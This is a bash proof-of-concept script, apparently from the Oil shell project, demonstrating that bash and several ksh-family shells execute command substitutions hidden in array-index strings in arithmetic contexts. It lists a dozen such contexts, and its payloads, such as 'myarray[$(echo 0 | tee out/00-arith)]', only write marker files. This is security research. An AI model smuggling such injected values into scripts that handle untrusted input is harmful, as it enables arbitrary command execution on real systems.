#!/bin/bash
# Author: Andy Chu (andy@oilshell.org)
#
# Demo of unexpected eval in bash.
#
# Show all the contexts where this happens:
#
# ./ss2-demos.sh contexts
#
# These may also be useful if you compile your own bash:
#
# ./ss2-demos.sh with-bash5
# ./ss2-demo.sh with-bash44

# TODO:
# - Test pre-shellshock shells to see what was changed

# I think this is less severe than ShellShock in one way, and more severe in
# another way:
#
# - Less severe because the script author must perform arithmetic (for a very
#   loose definition of arithmetic)
# - More severe in other ways because code is executed in arbitrary variables,
#   not just env variables, as I believe was the case with ShellShock v1.

set -o nounset
set -o pipefail
set -o errexit

# I tried this earlier in ~/git/scratch/shellshock.  But I wasn't using ARRAY
# access.

# This blog post turned out to be useful.  It lists all the contexts where
# arithmetic happens.
#
# Lexical State and How We Use It
# http://www.oilshell.org/blog/2016/10/19.html
#
# TODO: Update blog post with [[ -eq ]]

contexts() {
  local -a myarray=(7 8 9 10 11)

  mkdir -p out
  rm -f -v out/*

  local x

  # Arith substitution
  x='myarray[$(echo 0 | tee out/00-arith)]'
  echo $(( $x + 42 ))

  x='myarray[$(echo 1 | tee out/01-arith2)]'
  echo $(( x + 42 ))

  local varname

  varname='myarray[$(echo 2 | tee out/02-printf-v)]'
  printf -v "$varname" '%10s' foo

  varname='myarray[$(echo 3 | tee out/03-unset)]'
  unset "$varname"

  varname='myarray[$(echo 4 | tee out/04-indirect)]'
  echo "${!varname}"  # error, but still writes the file

  local x

  # [ Does NOT cause the problem.
  x='myarray[$(echo 5 | tee out/05-test)]'
  [ "$x" -gt 0 ] && echo GREATER

  # DOES cause the problem!
  x='myarray[$(echo 6 | tee out/06-bracket)]'
  [[ "$x" -gt 0 ]] && echo GREATER

  # Does NOT cause the problem, because [[ == is for strings, not arithmetic.
  x='myarray[$(echo 7 | tee out/07-bracket)]'
  [[ "$x" == 0 ]] || echo 'not greater'

  # Arrays
  x='myarray[$(echo 8 | tee out/08-index)]'
  echo "${myarray[x]}"  # arithmetic context here

  # Arith command (different than substitution)
  x='myarray[$(echo 9 | tee out/09-arith)]'
  (( x == 0 )) || echo 'not zero'

  # Slice
  x='myarray[$(echo 10 | tee out/10-slice)]'
  echo ${myarray[@]:$x:20}

  # For loop
  x='myarray[$(echo 11 | tee out/11-for)]'
  for (( i=x; i < 1; i++ )); do
    echo hi
  done

  # LHS assignment
  x='myarray[$(echo 12 | tee out/12-lhs)]'
  otherarray[x]=foo

  # Assoc array literal
  x='myarray[$(echo 13 | tee out/13-assoc)]'
  myassoc=([x]=foo)

  # This one is different because it doesn't accept arbitrary code.
  # The arbitrary code has to be unquoted and not have spaces, etc.
  #
  # bash '-v' is a misfeature.  Do other shells have it?
  #
  # From Stephane Chazelas.
  # https://unix.stackexchange.com/questions/172103/security-implications-of-using-unsanitized-data-in-shell-arithmetic-evaluation/172109#172109

  x='/ -o -v myarray[0$(uname>out/14-unquoted-test-arg)]'
  [ -f $x ] && true

  head out/*
  ls -l out/
}

# Arithmetic contexts

with-bash5() {
  local bin=~/src/languages/bash-5.0/bash 

  $bin --version
  $bin $0 contexts
}

# No difference
with-bash44() {
  local bin=~/src/languages/bash-4.4/bash 

  $bin --version
  $bin $0 contexts
}

with-bash43() {
  local bin=bash

  $bin --version
  $bin $0 contexts
}

# It has to be in an array index to work!
arith-compare() {
  local -a myarray=(7 8 9)

  local code='myarray[1]'
  echo $(( $code + 42 ))

  local code='myarray[$(echo 1 | tee out/20-arith)]'

  echo $(( $code + 42 ))

  # NOT ALLOWED, because it's not an array
  local code='$(echo 3 | tee out/21-arith)'
  echo $(( $code + 42 ))

  ls -l out/
}

# bash 4.2 has the same distinction
arith-compare-with-42() {
  local bin=~/src/languages/bash-4.4/bash 

  $bin --version
  $bin $0 arith-compare
}

other-shells() {
  set +o errexit
  for sh in dash mksh zsh; do 
    echo 
    echo --- $sh ---
    echo
    $sh ./ss2-minimal.sh
  done
}

with-zsh() {
  zsh ./ss2-minimal.sh
}

with-mksh() {
  mksh ./ss2-minimal.sh
}

# Fails but still executes arbitrary code!!!  Geez.
with-posh() {
  posh ./ss2-minimal.sh
}

# Exploited
with-loksh() {
  ~/git/languages/loksh/ksh ./ss2-minimal.sh
}

# Exploited
with-ksh93() {
  ~/git/languages/ast/build/src/cmd/ksh93/ksh ./ss2-minimal.sh
}

one-liner() {
  local sh=${1:-bash}
  rm -f PWNED
  X='a[$(echo 42 | tee PWNED)]' $sh -c 'echo $(( X ))'
  ls -l PWNED
}

"$@"
